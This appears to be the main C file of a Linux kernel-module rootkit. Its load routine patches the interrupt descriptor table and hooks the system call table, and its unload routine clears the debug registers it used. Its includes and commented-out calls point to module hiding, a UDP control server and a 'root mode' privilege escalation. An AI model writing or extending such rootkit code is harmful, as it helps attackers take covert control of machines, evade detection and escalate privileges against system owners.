#include "utils.h"
#include "core.h"
#include "syscall_table.h"
#include "sys_escalation.h"
#include "server.h"
#include "module_hiding.h"
#include "hook.h"
#include "dr_breakpoints.h"

static int idt_patched;

/* load the LKM */
static int __init module_t_load(void)
{
  /* do the hiding process if in STEALTH MODE */
  /* if (STEALTH_MODE) */
  /*   do_hide_module(); */

  /* start the UDP server */
  //server_start();

  idt_patched = !patch_idt();
  if (!idt_patched)
	return 1;

  hook_syscall_table();

  return 0;
}

/* unload the LKM */
static void __exit module_t_unload(void)
{
  /* check if "root mode" is enabled and disable it */
  if (sys_esc_flag) {
    /* reset normal permissions behavior */
    //undo_priv_esc();
  }

  if (idt_patched)
	unpatch_idt();

  on_each_cpu_set_dr(7, 0x0);

  /* stop the UDP server */
  //server_stop();
  
}

module_init(module_t_load);
module_exit(module_t_unload);
